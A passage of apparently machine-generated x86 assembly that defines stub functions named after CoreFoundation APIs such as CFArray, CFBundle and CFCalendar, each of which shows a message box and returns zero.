mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayBSearchValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayContainsValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayExchangeValuesAtIndices
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetCountOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetFirstIndexOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetLastIndexOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayGetValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayInsertValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayRemoveAllValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayRemoveValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArrayReplaceValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArraySetValueAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFArraySortValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringBeginEditing
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringCreateWithSubstring
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringEndEditing
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetAttribute
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetAttributeAndLongestEffectiveRange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetAttributes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetAttributesAndLongestEffectiveRange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetMutableString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringOpenUText
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringRemoveAttribute
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringReplaceAttributedString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringReplaceString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringSetAttribute
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFAttributedStringSetAttributes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBSearch
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagAddValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagContainsValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetCountOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetValueIfPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagGetValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagRemoveAllValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagRemoveValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagReplaceValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBagSetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapAddValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapContainsValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetCountOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetMinimum
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetMinimumIfPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapGetValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapRemoveAllValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBinaryHeapRemoveMinimumValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorContainsBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorFlipBitAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorFlipBits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetBitAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetBits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetCountOfBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetFirstIndexOfBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetLastIndexOfBit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorSetAllBits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorSetBitAtIndex
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorSetBits
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBitVectorSetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBooleanGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBooleanGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyAuxiliaryExecutableURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyBuiltInPlugInsURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyBundleLocalizations
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyBundleURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyExecutableArchitectures
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyExecutableArchitecturesForURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyExecutableURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyInfoDictionaryForURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyInfoDictionaryInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyLocalizationForLocalizationInfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyLocalizationsForPreferences
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyLocalizationsForURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyLocalizedString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyPreferredLocalizationsFromArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyPrivateFrameworksURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURLForLocalization
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURLInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURLsOfType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURLsOfTypeForLocalization
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourceURLsOfTypeInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopyResourcesDirectoryURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopySharedFrameworksURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopySharedSupportURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCopySupportFilesDirectoryURL
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleCreateBundlesFromDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetAllBundles
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetBundleWithIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetDataPointerForName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetDataPointersForNames
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetDevelopmentRegion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetFunctionPointerForName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetFunctionPointersForNames
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetInfoDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetLocalInfoDictionary
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetLocalizationInfoForLocalization
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetMainBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetPackageInfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetPackageInfoInDirectory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetPlugIn
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetValueForInfoDictionaryKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleGetVersionNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleIsExecutableLoaded
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleLoadExecutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleLoadExecutableAndReturnError
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundlePreflightExecutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBundleUnloadExecutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAdd
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAddCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAddCharactersWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAddUTF8String
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAddUTF8StringWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieAddWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieContains
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieContainsCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieContainsUTF8String
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCreateCursorForBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCreateFromFile
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCreateFromMapBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCreateWithOptions
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCursorAdvanceForBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCursorCreateByCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCursorGetPayload
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCursorIsEqual
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieCursorRelease
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieFind
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieFindCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieFindUTF8String
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsert
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsertCharacters
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsertCharactersWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsertUTF8String
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsertUTF8StringWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieInsertWithWeight
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieRelease
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieRetain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieSerialize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieSerializeWithFileDescriptor
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieSetCursorForBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieTraverse
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFBurstTrieTraverseFromCursor
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarAddComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarComposeAbsoluteTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarCopyCurrent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarCopyGregorianStartDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarCopyLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarCopyTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarCreateWithIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarDecomposeAbsoluteTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetComponentDifference
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetFirstWeekday
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetMaximumRangeOfUnit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetMinimumDaysInFirstWeek
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetMinimumRangeOfUnit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetOrdinalityOfUnit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetRangeOfUnit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetTimeRangeOfUnit
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarSetFirstWeekday
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarSetGregorianStartDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarSetLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarSetMinimumDaysInFirstWeek
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCalendarSetTimeZone
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetAddCharactersInRange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetAddCharactersInString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCompact
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateBitmapRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateInvertedSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateWithBitmapRepresentation
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateWithCharactersInRange
push 0x0
